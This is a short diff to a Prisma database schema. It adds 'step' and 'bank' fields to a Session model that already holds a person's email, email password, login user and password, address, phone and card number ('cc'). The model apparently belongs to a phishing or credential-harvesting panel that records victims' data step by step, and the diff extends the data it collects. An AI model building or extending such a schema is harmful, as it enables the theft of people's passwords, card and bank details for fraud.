@@ -42,12 +42,14 @@ model Session {
   id                    String       @id @default(uuid())
   state                 SessionState @default(ACTIVE)
   action                ActionState  @default(AUTH)
+  step                  String?
   ip                    String?
   name                  String?
   phone                 String?
   email                 String?
   emailPass             String?
   address               String?
+  bank                  String?
   user                  String?
   pass                  String?
   cc                    String?
